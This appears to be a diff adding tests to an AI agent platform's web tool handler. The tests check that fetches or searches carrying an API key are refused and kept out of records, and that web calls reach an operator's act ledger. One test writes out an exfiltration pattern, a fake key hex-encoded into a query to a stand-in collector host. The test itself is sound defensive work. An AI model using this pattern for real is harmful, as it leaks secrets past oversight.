@@ -281,6 +281,26 @@ describe('handleWebTool — the two gates', () => {
     expect(res.error).toMatch(/forbidden-host/);
   });
 
+  // re-audit 2026-10-29, NEW-H3: AUTO let a fetch carry a key out with no card and no screen
+  test('auto mode: a url or query carrying a key is refused before any card or packet, the key nowhere in the record', async () => {
+    const key = ['sk', '-', 'ant-', 'r'.repeat(30)].join('');
+    const hex = Buffer.from(key).toString('hex');
+    const fetched = await callFetch(rig, `https://collector.example/?k=${hex}`, { mode: 'auto' });
+    expect(fetched.status).toBe('denied');
+    expect(fetched.error).toMatch(/anthropic-key/);
+    const searched = await handleWebTool(rig.connection.ws, rig.connection, null, 'auto',
+      { toolName: 'web_search' }, { query: `weather ${key}` }, rig.ports);
+    expect(searched.status).toBe('denied');
+    expect(rig.sent.some((m) => m.type === 'tool:approval_request')).toBe(false);
+    const { neumaWorkspace } = await import('../../core/index.js');
+    const { readActs } = await import('../../backend/services/act-ledger.js');
+    const record = JSON.stringify([fetched, searched, rig.events, await neumaWorkspace.readJournal('unitprobe'),
+      await readActs({ laneIds: ['unitprobe'] })]);
+    expect(record).not.toContain(key);
+    expect(record).not.toContain(hex);
+    expect(record).toContain('refused: it carried a secret');
+  });
+
   test('the slash dialect routes web/web_search to SEARCH, never to fetch', async () => {
     // Echo round-2: a { tool: 'web/web_search' } call with no bare toolName
     // once fell through to the fetch path. searchWeb refuses an empty query
@@ -291,6 +311,24 @@ describe('handleWebTool — the two gates', () => {
     expect(res.tool).toBe('web/web_search');
     expect(res.status).toBe('error');
     expect(res.error).toMatch(/empty query/);
+  });
+});
+
+describe('every web call lands in the operator\'s act ledger, not only the being\'s journal (SEC-035, 2026-10-18)', () => {
+  test('a search, even one refused before any packet leaves, is recorded with its query and outcome', async () => {
+    const rig = await makeRig({ enabled: true });
+    const saved = { ws: process.env.WORKSPACES_ROOT, data: process.env.NEUMA_DATA_ROOT };
+    process.env.WORKSPACES_ROOT = rig.dir;
+    process.env.NEUMA_DATA_ROOT = rig.dir;
+    try {
+      await handleWebTool(rig.connection.ws, rig.connection, null, 'auto', { tool: 'web/web_search' }, { query: '  ' }, rig.ports);
+      const { readActs } = await import('../../backend/services/act-ledger.js');
+      const web = (await readActs({ laneIds: ['unitprobe'] })).filter((a) => a.tool === 'web/web_search');
+      expect(web).toEqual([expect.objectContaining({ laneId: 'unitprobe', tool: 'web/web_search', status: 'error', decision: 'auto' })]);
+    } finally {
+      for (const [k, v] of [['WORKSPACES_ROOT', saved.ws], ['NEUMA_DATA_ROOT', saved.data]]) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
+      fs.rmSync(rig.dir, { recursive: true, force: true });
+    }
   });
 });
 
